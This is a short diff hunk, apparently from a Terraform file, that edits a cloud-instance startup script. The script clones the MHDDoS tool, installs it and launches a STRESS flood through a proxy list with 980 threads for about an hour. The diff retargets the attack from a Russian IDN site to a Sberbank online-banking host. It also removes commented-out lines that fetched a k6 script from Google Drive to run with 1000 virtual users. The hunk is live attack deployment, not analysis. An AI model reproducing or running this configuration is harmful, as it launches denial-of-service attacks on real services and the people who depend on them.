@@ -43,10 +43,7 @@ cd tmp
 git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip3 install -r requirements.txt
-python3 start.py STRESS http://xn--80aqakjqje5byf.xn--80adrabb4aegksdjbafk0u.xn--p1ai 0 980 proxy.txt 91 3601
-#sudo gdown -O script.js "https://docs.google.com/uc?export=download&id=1WQmvlvAKbwuqH5sJb1YP0_gVTZnTZPtk"
-#chmod +x script.js
-#k6 run script.js --vus 1000 --duration 3600s
+python3 start.py STRESS https://scr.online.sberbank.ru 0 980 proxy.txt 91 3601
 EOF
   tags = {
     Name = "${var.env_name}"
